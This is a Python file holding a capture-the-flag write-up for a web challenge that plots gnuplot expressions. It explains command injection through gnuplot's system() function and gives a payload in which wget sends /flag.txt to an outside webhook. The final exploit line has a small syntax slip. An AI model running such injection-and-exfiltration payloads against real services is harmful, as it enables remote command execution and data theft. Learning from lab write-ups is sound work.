import requests

url = 'http://plottyboy.challs.cyberchallenge.it/'
print(requests.head(url).headers)

# SOLUTION:
# x**2; system "wget --post-data=$(cat /flag.txt) [WEBHOOK URL]"

# WRITE UP #################################################################################
#  
# FOOTPRINTING
# -----------------------------------------------------------------------------------------
# Opening the url we can see a textarea where we can write some text and note that tiping 
# characters the web server send us nothing, while tiping number or expression, it send a 
# plot of our function, for example you can try with x**2.
# Looking into network section of the browser inspector, after we have introduced a valid
# expression, we can see that the sent file is called "pyGnuPlot_out.png" by the web server,
# so we can say that under the hood there is a gnuplot wrapper in a python server, infact
# requesting the header you can read in an entry "Server : gunicorn", which is a python 
# based webserver.
# EXPLOITING
# -----------------------------------------------------------------------------------------
# Taking in mind that we are working with gnuplot and doing a google research, we discover
# that gnuplot can execute arbitrary commands using the builtin function "system".
# However we have to concatenate 2 commands because the web server won't respond if we don't
# inject a valid function.
# To concatenate 2 gnuplot commands we can use semicolums like a common shell.
# So the exploit will be similar to this:
#
#                        [VALID FUNCTION];system"[ARBITRARY COMMAND]"
# 
# Now the exploiting became very trivial. We can use a command like wget or curl to do a
# post request to a specific public ip we can access, for example webhook.site.
# We need use the "--post-file=[FILE]" argument to send the flag to our webhook url.
# The final exploit is:
#
#            [VALID FUNCTION];system"wget --post-file=$(cat /flag.txt [WEBHOOK URL]"
# ------------------------------------------------------------------------------------------